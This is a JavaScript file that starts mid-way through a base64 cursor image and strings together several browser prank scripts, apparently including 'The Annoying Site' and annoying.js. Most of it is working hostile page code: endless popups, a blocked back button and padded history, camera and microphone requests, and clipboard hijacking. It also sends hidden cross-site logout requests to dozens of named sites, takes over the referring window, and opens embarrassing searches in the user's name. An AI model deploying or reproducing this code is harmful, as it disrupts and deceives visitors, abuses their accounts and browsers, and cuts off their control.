TG1P8sxMv/Ks7G/////wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////AjKloP81l53/N5mf/zaXof85mKL/IFpm/zR4gv87i5T/Laez/0m1x/9avdH/Mb2//zO3vP89ydD/PdTa/zPh5P810cr/////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8CTKif/ziztP8ys73/LL/K/yjI0v8nv8f/Jo6V/0LBx/85x8//PNXc/z3N0P8HU2L/GTVc/32NpP9rmab/N5+k/////wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Av///wLH+PH/QcTA/z7GzP8tgYn/YnmL/xUUNv+Wv8z/MFJe/z2Wnv87t8L/IW1w/yRMU/8PLDb/ED5J/z6NkP9Bq7D/KKyx/////wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/////wL///8C////Av///wI5p5//NoSB/y5vd/8nYWr/CjA+/y6LjP8cSE//KlBc/zR9kf8QVmL/LVdq/zJecP8lbnL/MJud/zO3sP9oysf/MLjF/zKArf8ps8f/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/////Av///wL///8CKIOX/zGluf9Al5j/KoeG/y12fv8sX2//KFRd/zRVZf8ni6P/Mq3B/0rI3P9t2ev/SbPB/y9Tc/86bYT/////Av///wJkkJf/Ls7K/yHN0f8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8qma//HVh3/0egvv9Zu77/////Ake6rv8zlo//PJaX/zyZmv8oen7/H3iQ/z3V6/822Ob/JNPf/zfd5v8n1dj/O8nQ/zbKx/////8C////Av///wJD4PH/////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/zKfsP8tn6//PsjE/////wL///8C////AjGvov8mXHP/MVd5/0Kcuv8i1db/Jtfe/yHb4f8z4+r/M+Dm/yTf4/8/x8//levn/////wL///8C////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/////Aiewx/////8C////Av///wL///8CicvJ/zS7tf8yxML/NMLG/yXV2/8p2eT/Nd/t/0Dh8P8x3ej/I93l/xzg1f////8C////Av///wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/////wL///8CftrL/zLKyv8i2db/INfd/yLX4/803u7/K9nk/yLk5P8S3tT/////Av///wL///8C////Av///wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////Av///wL///8C////Av///wL///8C////AmnQz/8c18v/QNfU/zHf3f8K5Nb/////Av///wL///8C////Av///wL///8C////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAA//////////////////5////wH///4A///8AH//+AA///gAH//wAA//8AAP/+AAB//gAAf/4AAH/+AAB//gAAf/4AAH//AAB//wAAf/8AAP//AAB/94AAD/cAAY/wQAHf8OAB//XgA//wMAf///wf//////////////////////8='), auto; 
}`
var style = document.createElement("style");
style.innerHTML = css;
document.head.appendChild(style);


var css = `
@keyframes roll {
  100%{
    transform:rotate(360deg)
  }
}
body {
  animation-name: roll; 
  animation-duration: 4s; 
  animation-iteration-count: 1;
}
`
var style = document.createElement("style");
style.innerHTML = css;
document.head.appendChild(style);
(function() {
    const options = {
        'text': prompt('Text:', 'Weee!'),
        'size': 150,
        'weight': 800,
        'speed': 2500
    }

    for (let i = 0; i < 50; i++) {
        let element = document.createElement('div');
        element.className = 'floatingElements'
        element.style = `width: 100%; height: 100%; margin: auto; pointer-events: none; user-select: none; font-weight: ${options.weight}; font-size: ${options.size}px; position: absolute; z-index: 2147483647; transition: all ${options.speed/1000}s linear; transform-origin: center center; text-align: center;`;
        element.textContent = options.text;

        document.body.appendChild(element);
    }

    setInterval(() => {
        let elements = document.getElementsByClassName('floatingElements');
        for (let i = 0; i < elements.length; i++) {
            elements[i].style.color = color();
            elements[i].style.opacity = Math.random() + .1;
            elements[i].style.transform = `rotate(${random(0,360)}deg) translate(${random(-1000,1000)}px, ${random(-500,500)}px) translate3d(${random(0,200)}px,${random(0,200)}px,${random(0,200)}px) rotateX(${random(0,360)}deg) rotateY(${random(0,360)}deg) rotateZ(${random(0,360)}deg)`;
        }
    }, options.speed);

    function random(min, max) { return Math.floor(Math.random() * (max - min) + min); }

    function color() { return ['red', 'orange', 'yellow', 'green', 'blue', 'purple', 'pink'][Math.floor(Math.random() * 7)]; }
})();
var audio2 = document.createElement("audio");
  audio2.src = "http://soundbible.com/mp3/Fart-Common-Everyday-Fart_Mike-Koenig.mp3";
  audio2.loop = true;
  audio2.play();
  const SCREEN_WIDTH = window.screen.availWidth
const SCREEN_HEIGHT = window.screen.availHeight
const WIN_WIDTH = 480
const WIN_HEIGHT = 260
const VELOCITY = 15
const MARGIN = 10
const TICK_LENGTH = 50

const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

const ART = [
  `
┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
┈┈┈┈╭━━━━━━╮┊☆ ┊┊
┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊
┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏┊┊
┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊
☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊
┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊
  `,
  `
░░▓▓░░░░░░░░▓▓░░
░▓▒▒▓░░░░░░▓▒▒▓░
░▓▒▒▒▓░░░░▓▒▒▒▓░
░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░
░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒░▓▒▒▒▒▒░▓▒▒▓
▓▒▒▒▓▓▒▒▒▓▒▓▓▒▒▓
▓▒░░▒▒▒▒▒▒▒▒▒░░▓
▓▒░░▒▓▒▒▓▒▒▓▒░░▓
░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░
░░▓▒▒▒▒▒▒▒▒▒▒▓░░
░░░▓▓▓▓▓▓▓▓▓▓░░░
  `
]

const SEARCHES = [
  'where should i bury the body',
  'why does my eye twitch',
  'why is my poop green',
  'why do i feel so empty',
  'why do i always feel hungry',
  'why do i always have diarrhea',
  'why does my anus itch',
  'why does my belly button smell',
  'why does my cat attack me',
  'why does my dog eat poop',
  'why does my fart smell so bad',
  'why does my mom hate me',
  'why does my pee smell bad',
  'why does my poop float',
  'proof that the earth is flat'
]

const VIDEOS = [
  'albundy.mp4',
  'badger.mp4',
  'cat.mp4',
  'hasan.mp4',
  'heman.mp4',
  'jozin.mp4',
  'nyan.mp4',
  'rickroll.mp4',
  'space.mp4',
  'trolol.mp4'
]

const FILE_DOWNLOADS = [
  'cat-blue-eyes.jpg',
  'cat-ceiling.jpg',
  'cat-crosseyes.jpg',
  'cat-cute.jpg',
  'cat-hover.jpg',
  'cat-marshmellows.jpg',
  'cat-small-face.jpg',
  'cat-smirk.jpg',
  'patreon.png'
]

const PHRASES = [
  'The wheels on the bus go round and round, round and round, round and round. The wheels on the bus go round and round, all through the town!',
  'Dibidi ba didi dou dou, Di ba didi dou, Didi didldildidldidl houdihoudi dey dou',
  'I like fuzzy kittycats, warm eyes, and pretending household appliances have feelings',
  'I\'ve never seen the inside of my own mouth because it scares me to death.',
  'hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw',
  'abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz',
  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak',
  'eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo'
]

const LOGOUT_SITES = {
  'AOL': ['GET', 'https://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us'],
  'AOL 2': ['GET', 'https://api.screenname.aol.com/auth/logout?state=snslogout&r=' + Math.random()],
  'Amazon': ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
  'Blogger': ['GET', 'https://www.blogger.com/logout.g'],
  'Delicious': ['GET', 'https://www.delicious.com/logout'], // works!
  'DeviantART': ['POST', 'https://www.deviantart.com/users/logout'],
  'DreamHost': ['GET', 'https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout'],
  'Dropbox': ['GET', 'https://www.dropbox.com/logout'],
  'eBay': ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
  'Gandi': ['GET', 'https://www.gandi.net/login/out'],
  'GitHub': ['GET', 'https://github.com/logout'],
  'GMail': ['GET', 'https://mail.google.com/mail/?logout'],
  'Google': ['GET', 'https://www.google.com/accounts/Logout'], // works!
  'Hulu': ['GET', 'https://secure.hulu.com/logout'],
  'Instapaper': ['GET', 'https://www.instapaper.com/user/logout'],
  'Linode': ['GET', 'https://manager.linode.com/session/logout'],
  'LiveJournal': ['POST', 'https://www.livejournal.com/logout.bml', {'action:killall': '1'}],
  'MySpace': ['GET', 'https://www.myspace.com/index.cfm?fuseaction=signout'],
  'NetFlix': ['GET', 'https://www.netflix.com/Logout'],
  'New York Times': ['GET', 'https://www.nytimes.com/logout'],
  'Newegg': ['GET', 'https://secure.newegg.com/NewMyAccount/AccountLogout.aspx'],
  'Photobucket': ['GET', 'https://photobucket.com/logout'],
  'Skype': ['GET', 'https://secure.skype.com/account/logout'],
  'Slashdot': ['GET', 'https://slashdot.org/my/logout'],
  'SoundCloud': ['GET', 'https://soundcloud.com/logout'],
  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
  'ThinkGeek': ['GET', 'https://www.thinkgeek.com/brain/account/login.cgi?a=lo'],
  'Threadless': ['GET', 'https://www.threadless.com/logout'],
  'Tumblr': ['GET', 'https://www.tumblr.com/logout'],
  'Vimeo': ['GET', 'https://vimeo.com/log_out'],
  'Wikipedia': ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
  'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
  'Woot': ['GET', 'https://account.woot.com/logout'],
  'Wordpress': ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
  'Yahoo': ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
  'YouTube': ['POST', 'https://www.youtube.com', {'action_logout': '1'}]
}

/**
 * Array to store the child windows spawned by this window.
 */
const wins = []

/**
 * Count of number of clicks
 */
let interactionCount = 0

/**
 * Number of iframes injected into the page for the "super logout" functionality.
 * See superLogout().
 */
let numSuperLogoutIframes = 0

/**
 * Is this window a child window? A window is a child window if there exists a
 * parent window (i.e. the window was opened by another window so `window.opener`
 * is set) *AND* that parent is a window on the same origin (i.e. the window was
 * opened by us, not an external website)
 */
const isChildWindow = (window.opener && isParentSameOrigin()) ||
  window.location.search.indexOf('child=true') !== -1

/**
 * Is this window a parent window?
 */
const isParentWindow = !isChildWindow

/*
 * Run this code in all windows, *both* child and parent windows.
 */
init()

/*
 * Use `window.opener` to detect if this window was opened by another window, which
 * will be its parent. The `window.opener` variable is a reference to the parent
 * window.
 */
if (isChildWindow) initChildWindow()
else initParentWindow()

/**
 * Initialization code for *both* parent and child windows.
 */
function init () {
  confirmPageUnload()
  registerProtocolHandlers()

  interceptUserInput(event => {
    interactionCount += 1

    // Prevent default behavior (breaks closing window shortcuts)
    event.preventDefault()
    event.stopPropagation()

    startVibrateInterval()
    enablePictureInPicture()
    triggerFileDownload()

    focusWindows()
    copySpamToClipboard()
    speak()

    // Capture key presses on the Command or Control keys, to interfere with the
    // "Close Window" shortcut.
    if (event.key === 'Meta' || event.key === 'Control') {
      showModal()
    } else {
      if (isParentWindow && Math.random() < 0.20) requestFullscreen()
      else requestCameraAndMic()
    }

    // 'touchstart' and 'touchend' events are not able to open a new window
    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
    // a clever way to exclude touch events.
    if (event.which !== 0) openWindow()
  })
}

/**
 * Initialization code for child windows.
 */
function initChildWindow () {
  hideCursor()
  moveWindowBounce()
  startVideo()
  detectWindowClose()
  triggerFileDownload()
  speak()

  interceptUserInput(event => {
    if (interactionCount === 1) {
      startAlertInterval()
    }
  })
}

/**
 * Initialization code for parent windows.
 */
function initParentWindow () {
  showHelloMessage()
  blockBackButton()
  fillHistory()
  startInvisiblePictureInPictureVideo()

  interceptUserInput(event => {
    // Only run these on the first interaction
    if (interactionCount === 1) {
      attemptToTakeoverReferrerWindow()
      hideCursor()
      startVideo()
      startAlertInterval()
      superLogout()
      removeHelloMessage()
    }
  })
}

/**
 * Sites that link to theannoyingsite.com may specify `target='_blank'` to open the
 * link in a new window. For example, Messenger.com from Facebook does this.
 * However, that means that `window.opener` will be set, which allows us to redirect
 * that window. YES, WE CAN REDIRECT THE SITE THAT LINKED TO US.
 * Learn more here: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
 */
function attemptToTakeoverReferrerWindow () {
  if (isParentWindow && window.opener && !isParentSameOrigin()) {
    window.opener.location = `${window.location.origin}/?child=true`
  }
}

/**
 * Returns true if the parent window is on the same origin. It's not enough to check
 * that `window.opener` is set, because that will also get set if a site on a
 * different origin links to theannoyingsite.com with `target='_blank'`.
 */
function isParentSameOrigin () {
  try {
    // May throw an exception if `window.opener` is on another origin
    return window.opener.location.origin === window.location.origin
  } catch (err) {
    return false
  }
}

/**
 * Ask the user "are you sure you want to leave this page?". In most browsers,
 * this will not actually do anything unless the user has at least one interaction
 * with the page before they close it.
 */
function confirmPageUnload () {
  window.addEventListener('beforeunload', event => {
    speak('Please don\'t go!')
    event.returnValue = true
  })
}

/**
 * Attempt to register all possible browser-whitelisted protocols to be handled by
 * this web app instead of their default handlers.
 */
function registerProtocolHandlers () {
  if (typeof navigator.registerProtocolHandler !== 'function') return

  const protocolWhitelist = [
    'bitcoin',
    'geo',
    'im',
    'irc',
    'ircs',
    'magnet',
    'mailto',
    'mms',
    'news',
    'ircs',
    'nntp',
    'sip',
    'sms',
    'smsto',
    'ssh',
    'tel',
    'urn',
    'webcal',
    'wtai',
    'xmpp'
  ]

  const handlerUrl = window.location.href + '/url=%s'

  protocolWhitelist.forEach(proto => {
    navigator.registerProtocolHandler(proto, handlerUrl, 'The Annoying Site')
  })
}

/**
 * Attempt to access the user's camera and microphone, and attempt to enable the
 * torch (i.e. camera flash) if the device has one.
 */
function requestCameraAndMic () {
  if (!navigator.mediaDevices ||
      typeof navigator.mediaDevices.getUserMedia !== 'function') {
    return
  }

  navigator.mediaDevices.enumerateDevices().then(devices => {
    const cameras = devices.filter((device) => device.kind === 'videoinput')

    if (cameras.length === 0) return
    const camera = cameras[cameras.length - 1]

    navigator.mediaDevices.getUserMedia({
      deviceId: camera.deviceId,
      facingMode: ['user', 'environment'],
      audio: true,
      video: true
    }).then(stream => {
      const track = stream.getVideoTracks()[0]
      const imageCapture = new window.ImageCapture(track)

      imageCapture.getPhotoCapabilities().then(() => {
        // Let there be light!
        track.applyConstraints({ advanced: [{torch: true}] })
      }, () => { /* No torch on this device */ })
    }, () => { /* ignore errors */ })
  })
}

/**
 * Start vibrating the device at random intervals, on supported devices.
 * Requires user-initiated event.
 */
function startVibrateInterval () {
  if (typeof window.navigator.vibrate !== 'function') return
  setInterval(() => {
    const duration = Math.floor(Math.random() * 600)
    window.navigator.vibrate(duration)
  }, 1000)
}

/**
 * Intercept all user-initiated events and call the given the function, `onInput`.
 */
function interceptUserInput (onInput) {
  document.body.addEventListener('touchstart', onInput, { passive: false })

  document.body.addEventListener('mousedown', onInput)
  document.body.addEventListener('mouseup', onInput)
  document.body.addEventListener('click', onInput)

  document.body.addEventListener('keydown', onInput)
  document.body.addEventListener('keyup', onInput)
  document.body.addEventListener('keypress', onInput)
}

/**
 * Start an invisible, muted video so we have a one ready to put into
 * picture-in-picture mode on the first user-interaction.
 */
function startInvisiblePictureInPictureVideo () {
  const video = document.createElement('video')
  video.src = getRandomArrayEntry(VIDEOS)
  video.autoplay = true
  video.loop = true
  video.muted = true
  video.style = HIDDEN_STYLE

  document.body.appendChild(video)
}

/**
 * Active Safari's picture-in-picture feature, which let's show a video on the
 * desktop. Requires user-initiated event.
 */
function enablePictureInPicture () {
  const video = document.querySelector('video')
  if (video.webkitSetPresentationMode) {
    video.muted = false
    video.webkitSetPresentationMode('picture-in-picture')
  }
}

/**
 * Focus all child windows. Requires user-initiated event.
 */
function focusWindows () {
  wins.forEach(win => {
    if (!win.closed) win.focus()
  })
}

/**
 * Open a new popup window. Requires user-initiated event.
 */
function openWindow () {
  const { x, y } = getRandomCoords()
  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
  const win = window.open(window.location.pathname, '', opts)

  // New windows may be blocked by the popup blocker
  if (!win) return
  wins.push(win)

  if (wins.length === 2) setupSearchWindow(win)
}

/**
 * Hide the user's cursor!
 */
function hideCursor () {
  document.querySelector('html').style = 'cursor: none;'
}

/**
 * Trigger a file download immediately. One file download is allowed *without* user
 * interaction. Further file downloads should happen in response to a user-initiated
 * event or they will be blocked.
 */
function triggerFileDownload () {
  const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
  const a = document.createElement('a')
  a.href = fileName
  a.download = fileName
  a.click()
}

function speak (phrase) {
  if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
  window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
}

/**
 * Move the window around the screen and bounce off of the screen edges.
 */
function moveWindowBounce () {
  let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
  let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)

  window.setInterval(() => {
    const x = window.screenX
    const y = window.screenY
    const width = window.outerWidth
    const height = window.outerHeight

    if (x < MARGIN) vx = Math.abs(vx)
    if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
    if (y < MARGIN + 20) vy = Math.abs(vy)
    if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)

    window.moveBy(vx, vy)
  }, TICK_LENGTH)
}

/**
 * Show a random troll video in the window.
 */
function startVideo () {
  const video = document.createElement('video')

  video.src = getRandomArrayEntry(VIDEOS)
  video.autoplay = true
  video.loop = true
  video.style = 'width: 100%; height: 100%;'

  document.body.appendChild(video)
}

/**
 * When a child window closes, notify the parent window so it can remove it from
 * the list of child windows.
 */
function detectWindowClose () {
  window.addEventListener('unload', () => {
    if (!window.opener.closed) window.opener.onCloseWindow(window)
  })
}

/**
 * Handle a child window closing.
 */
function onCloseWindow (win) {
  const i = wins.indexOf(win)
  if (i >= 0) wins.splice(i, 1)
}

/**
 * Show the unsuspecting user a friendly hello message with a cat.
 */
function showHelloMessage () {
  const template = document.querySelector('template')
  const clone = document.importNode(template.content, true)
  document.body.appendChild(clone)
}

/**
 * Remove the hello message.
 */
function removeHelloMessage () {
  const helloMessage = document.querySelector('.hello-message')
  helloMessage.remove()
}

/**
 * Copy cat pictures onto the user's clipboard. Requires user-initiated event.
 */
function copySpamToClipboard () {
  const randomArt = getRandomArrayEntry(ART) + '\nCheck out https://theannoyingsite.com'
  clipboardCopy(randomArt)
}

/**
 * Copy given text, `text`, onto the user's clipboard.
 * Requires user-initiated event.
 */
function clipboardCopy (text) {
  // A <span> contains the text to copy
  var span = document.createElement('span')
  span.textContent = text
  span.style.whiteSpace = 'pre' // Preserve consecutive spaces and newlines

  // An <iframe> isolates the <span> from the page's styles
  var iframe = document.createElement('iframe')
  iframe.sandbox = 'allow-same-origin'
  document.body.appendChild(iframe)

  var win = iframe.contentWindow
  win.document.body.appendChild(span)

  var selection = win.getSelection()

  // Firefox fails to get a selection from <iframe> window, so fallback
  if (!selection) {
    win = window
    selection = win.getSelection()
    document.body.appendChild(span)
  }

  var range = win.document.createRange()
  selection.removeAllRanges()
  range.selectNode(span)
  selection.addRange(range)

  var success = false
  try {
    success = win.document.execCommand('copy')
  } catch (err) {
    console.log(err)
  }

  selection.removeAllRanges()
  span.remove()
  iframe.remove()

  return success
}

/**
 * Show an alert dialog at a regular interval
 */
function startAlertInterval () {
  setInterval(() => {
    showModal()
  }, 30000)
}

/**
 * Show a modal dialog. Modals capture focus from other OS apps and browser tabs.
 * Except in Chrome 64+, where modals can only capture focus from other OS apps,
 * but not from other tabs.
 */
function showModal () {
  if (Math.random() < 0.5) {
    showAlert()
  } else {
    window.print()
  }
}

/**
 * Show an alert with 1000's of lines of cat ASCII art.
 */
function showAlert () {
  const randomArt = getRandomArrayEntry(ART)
  const longAlertText = Array(200).join(randomArt)
  window.alert(longAlertText)
}

/**
 * Fullscreen the browser window
 */
function requestFullscreen () {
  const requestFullscreen = Element.prototype.requestFullscreen ||
    Element.prototype.webkitRequestFullscreen ||
    Element.prototype.mozRequestFullScreen ||
    Element.prototype.msRequestFullscreen

  requestFullscreen.call(document.body)
}

/**
 * Log the user out of top sites they're logged into, including Google.com.
 * Inspired by https://superlogout.com
 */
function superLogout () {
  function cleanup (el, delayCleanup) {
    if (delayCleanup) {
      delayCleanup = false
      return
    }
    el.parentNode.removeChild(el)
  }

  function get (url) {
    const img = document.createElement('img')
    img.onload = () => cleanup(img)
    img.onerror = () => cleanup(img)
    img.style = HIDDEN_STYLE
    document.body.appendChild(img)
    img.src = url
  }

  function post (url, params) {
    var iframe = document.createElement('iframe')
    iframe.style = HIDDEN_STYLE
    iframe.name = 'iframe' + numSuperLogoutIframes
    document.body.appendChild(iframe)

    numSuperLogoutIframes += 1

    const form = document.createElement('form')
    form.style = HIDDEN_STYLE

    let numLoads = 0
    iframe.onload = iframe.onerror = () => {
      if (numLoads >= 1) cleanup(iframe)
      numLoads += 1
    }
    form.action = url
    form.method = 'POST'
    form.target = iframe.name

    for (const param in params) {
      if (params.hasOwnProperty(param)) {
        const input = document.createElement('input')
        input.type = 'hidden'
        input.name = param
        input.value = params[param]
        form.appendChild(input)
      }
    }

    document.body.appendChild(form)
    form.submit()
  }
  for (let name in LOGOUT_SITES) {
    const method = LOGOUT_SITES[name][0]
    const url = LOGOUT_SITES[name][1]
    const params = LOGOUT_SITES[name][2] || {}

    if (method === 'GET') {
      get(url)
    } else {
      post(url, params)
    }

    const div = document.createElement('div')
    div.innerText = `Logging you out from ${name}...`

    const logoutMessages = document.querySelector('.logout-messages')
    logoutMessages.appendChild(div)
  }
}

/**
 * Disable the back button. If the user goes back, send them one page forward ;-)
 */
function blockBackButton () {
  window.addEventListener('popstate', () => {
    window.history.forward()
  })
}

/**
 * Fill the history with extra entries for this site, to make it harder to find
 * the previous site in the back button's dropdown menu.
 */
function fillHistory () {
  for (let i = 1; i < 20; i++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  }
  // Set location back to the initial location, so user does not notice
  window.history.pushState({}, '', window.location.pathname)
}

/**
 * Get random x, y coordinates for a new window on the screen. Takes into account
 * screen size, window size, and leaves a safe margin on all sides.
 */
function getRandomCoords () {
  const x = MARGIN +
    Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
  const y = MARGIN +
    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
  return { x, y }
}

/**
 * Get a random element from a given array, `arr`.
 */
function getRandomArrayEntry (arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

// TODO: document this
function setupSearchWindow (win) {
  if (!win) return
  win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[0])
  let searchIndex = 1
  let interval = setInterval(() => {
    if (searchIndex >= SEARCHES.length) {
      clearInterval(interval)
      win.window.location = window.location.pathname
      return
    }

    if (win.closed) {
      clearInterval(interval)
      onCloseWindow(win)
      return
    }

    win.window.location = window.location.pathname
    setTimeout(() => {
      const { x, y } = getRandomCoords()
      win.moveTo(x, y)
      win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
      searchIndex += 1
    }, 500)
  }, 2500)
}
(function(a) {
  /**
   * Resize the window to fullscreen (1024x768 always)
   */
  a.fullScreen = function () {
    window.resizeTo(1024,768);
  };
  /**
   * Always keep the browser full screen
   */
  a.keepFullScreen = function () {
    window.onresize = function() {
      window.resizeTo(1024, 768);
    };
  };
  /**
   * Disable right click so users can not copy!
   */
  a.noRightClick = function () {
    document.oncontextmenu = function(){ return false; };
  };
  /**
   * Make certain we're not loaded into an iframe
   */
  a.onTop = function () {
    if (parent.frames.length > 0) { top.location.replace(document.location); }
  };
  /**
   * Disable users dragging photos or text to they can't copy them
   */
  a.noDrag = function () {
    document.ondragstart = function(){ return false; };
  };
  /**
   * Disable users selecting text to they can't copy them
   */
  a.noSelect = function () {
    //no text selection, in IE
    document.onselectstart = function () {
      if (event.srcElement.type != "text" && event.srcElement.type != "textarea" && event.srcElement.type != "password") {
        return false;
      } else {
        return true;
      }
    };
    //no text selection, in Firefox
    document.onmousedown=function(e){
      var obj=e.target;
      if (obj.tagName.toUpperCase() == "INPUT" || obj.tagName.toUpperCase() == "TEXTAREA" || obj.tagName.toUpperCase() == "PASSWORD") {
        return true;
      } else {
        return false;
      }
    };
  };
  /**
   * Most users accidentally close the web page. Remind them of this.
   * @param {string} msg optional message. If empty, "Please come back!!1" is displayed.
   */
  a.dontLeave = function (msg) {
    var message = msg || "Please come back!!1";
    window.onunload=function() {
      function dontLeave() {
        alert(message);
      }
      dontLeave();
    };
  };
  /**
   * Disable users copying text via shortcuts
   */
  a.noCopy = function () {
    window.onkeydown = function(e) {
      if ( e.ctrlKey ) {
        return false;
      }
    };
  };
  /**
   * Refresh the page every minute so it stays up to date
   */
  a.keepUpToDate = function(){
    setTimeout(
      function(){window.location = window.location;},
      1000*60
    );
  };
  /**
   * suppress all error messages so we never have any
   */
  a.neverAnyBugs = function () {
    window.onerror = function() { return false; };
  };
  /**
  * prevent the dotted outlines from all links, they're ugly
  */
  /*jshint loopfunc: true */
  a.preventOutlines = function () {
    for(var i in (a = document.getElementsByTagName('a'))) {
      a[i].onmousedown = function() {
        this.blur(); // most browsers
        this.hideFocus = true; // ie
        this.style.outline = 'none'; // mozilla
      };
      a[i].onmouseout = a[i].onmouseup = function() {
        this.blur(); // most browsers
        this.hideFocus = false; // ie
        this.style.outline = null; // mozilla
      };
    }
  };
  /*jshint loopfunc: false */
  /**
   * open all links in a new window so users stay on the site
   */
  a.stayOnSite = function () {
    for(var i in (a = document.getElementsByTagName('a')) ) {
      a[i].href = "javascript:window.open('" + a[i].href + "')";
    }
  };
  /**
   * Add a copyright notice and a link back when someone copies text
   * @param {string} sitetitle optional title to be displayed next to the copyright notice
   */
  a.addCopyright = function (sitetitle) {
    addCopyrightFunction = function () {
      var body = document.getElementsByTagName('body')[0],
          selection = window.getSelection(),
          copyright = sitetitle || "annoying.js",
          pagelink = "<br />Read more at: <a href='"+document.location.href+"'>"+document.location.href+"</a><br />Copyright &copy;" + copyright,
          newdiv = document.createElement('div');

      newdiv.style.position='absolute';
      newdiv.style.left='-99999px';
      body.appendChild(newdiv);
      newdiv.innerHTML = selection + pagelink;

      selection.selectAllChildren(newdiv);
      window.setTimeout(function() {
        body_element.removeChild(newdiv);
      },0);
    };
    function bindEvent(el, eventName, eventHandler) {
      if (el.addEventListener){
        el.addEventListener(eventName, eventHandler, false);
      } else if (el.attachEvent){
        el.attachEvent('on'+eventName, eventHandler);
      }
    }
    bindEvent(document, 'copy', function () {
      addCopyrightFunction();
    });
  };
  /*
   * Copy the current url or a message to the clipboard automatically. Only works in IE!
   */
  a.copyToClipboard = function (msg) {
    var text = location.href || msg;
    if (window.clipboardData && clipboardData.setData) {
        clipboardData.setData('text', s);
    }
  };
  /**
   * prevent the user from using the back button
   */
  a.preventBack = function () {
    try {
        history.forward();
        setTimeout('preventBack()', 500);
    } catch (e) {}
  };
  /**
   * Execute all the annoying.js functions
   */
  a.kitchensink = function () {
    this.fullScreen();
    this.keepFullScreen();
    this.noRightClick();
    this.onTop();
    this.noDrag();
    this.noSelect();
    this.dontLeave();
    this.noCopy();
    this.keepUpToDate();
    this.neverAnyBugs();
    this.preventOutlines();
    this.stayOnSite();
    this.addCopyright(); //useless with the noCopy(); function!
    this.copyToClipboard();
    this.preventBack();
  };
}(Annoying));
Annoying.kitchensink();
